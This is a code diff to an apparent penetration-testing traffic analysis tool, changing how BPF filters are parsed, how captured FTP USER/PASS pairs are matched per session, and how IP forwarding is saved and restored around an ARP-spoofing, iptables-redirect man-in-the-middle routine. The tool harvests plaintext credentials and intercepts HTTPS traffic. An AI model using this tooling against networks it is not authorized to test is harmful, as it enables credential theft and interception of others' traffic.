@@ -13,9 +13,11 @@ All actions target hosts and networks you own or have written authorization to t
 from __future__ import annotations
 
 import asyncio
+import base64
 import json
 import logging
 import re
+import shlex
 import time
 from pathlib import Path
 from typing import Any, Optional
@@ -223,8 +225,9 @@ class TrafficAnalysisTool(Tool):
         if packet_count > 0:
             cmd += ["-c", str(packet_count)]
         if bpf_filter:
-            # BPF filter args passed as additional positional args to tcpdump
-            cmd += bpf_filter.split()
+            # BPF filter args passed as additional positional args to tcpdump;
+            # use shlex.split to preserve quoted tokens in complex expressions.
+            cmd += shlex.split(bpf_filter)
 
         if packet_count > 0:
             # tcpdump exits on its own after packet_count packets
@@ -564,8 +567,6 @@ class TrafficAnalysisTool(Tool):
                 continue
             src, dst, host, auth = parts[0], parts[1], parts[2], parts[3]
             if auth.lower().startswith("basic "):
-                import base64
-
                 try:
                     decoded = base64.b64decode(auth[6:].strip()).decode(errors="replace")
                     results.append(
@@ -663,18 +664,26 @@ class TrafficAnalysisTool(Tool):
             allow_nonzero=True,
         )
         results = []
-        current: dict = {}
+        # Keyed by (src, dst) to correctly attribute PASS to the most recent USER
+        # for that session, even when multiple sessions interleave.
+        pending: dict[tuple[str, str], dict] = {}
         for line in out.splitlines():
             parts = line.split("|")
             if len(parts) < 4:
                 continue
             src, dst, cmd, arg = parts[0], parts[1], parts[2].strip().upper(), parts[3]
             if cmd == "USER":
-                current = {"protocol": "FTP", "src_ip": src, "dst_ip": dst, "username": arg, "password": None}
-            elif cmd == "PASS" and current:
-                current["password"] = arg
-                results.append(current)
-                current = {}
+                pending[(src, dst)] = {
+                    "protocol": "FTP",
+                    "src_ip": src,
+                    "dst_ip": dst,
+                    "username": arg,
+                    "password": None,
+                }
+            elif cmd == "PASS" and (src, dst) in pending:
+                entry = pending.pop((src, dst))
+                entry["password"] = arg
+                results.append(entry)
         return results
 
     async def _harvest_telnet(self, pcap_file: str) -> list[dict]:
@@ -835,9 +844,19 @@ class TrafficAnalysisTool(Tool):
         setup_log: list[str] = []
 
         procs: list[asyncio.subprocess.Process] = []
+        orig_ip_forward = "0"
+        iptables_added = False
 
         try:
-            # 1. Enable IP forwarding
+            # 1. Save original IP forwarding state then enable
+            orig_out, _, _ = await self._run(
+                "sysctl",
+                "-n",
+                "net.ipv4.ip_forward",
+                timeout=5,
+                allow_nonzero=True,
+            )
+            orig_ip_forward = orig_out.strip() or "0"
             out, _, _ = await self._run(
                 "sysctl",
                 "-w",
@@ -845,7 +864,7 @@ class TrafficAnalysisTool(Tool):
                 timeout=10,
                 allow_nonzero=True,
             )
-            setup_log.append(f"ip_forward: {out}")
+            setup_log.append(f"ip_forward: {out} (was {orig_ip_forward})")
 
             # 2. iptables REDIRECT rule: intercept port 443 → mitmproxy
             await self._run(
@@ -866,6 +885,7 @@ class TrafficAnalysisTool(Tool):
                 str(listen_port),
                 timeout=10,
             )
+            iptables_added = True
             setup_log.append(f"iptables redirect 443 → {listen_port} added")
 
             # 3. ARP spoof both directions (target ↔ gateway)
@@ -937,6 +957,20 @@ class TrafficAnalysisTool(Tool):
                 setup_log.append("iptables redirect rule removed")
             except Exception as e:
                 setup_log.append(f"iptables cleanup warning: {e}")
+
+            # Restore original IP forwarding state
+            if orig_ip_forward == "0":
+                try:
+                    await self._run(
+                        "sysctl",
+                        "-w",
+                        "net.ipv4.ip_forward=0",
+                        timeout=10,
+                        allow_nonzero=True,
+                    )
+                    setup_log.append("ip_forward restored to 0")
+                except Exception as e:
+                    setup_log.append(f"ip_forward restore warning: {e}")
 
             # Restore ARP tables (restore is automatic when arpspoof exits,
             # but send gratuitous ARPs to speed recovery)
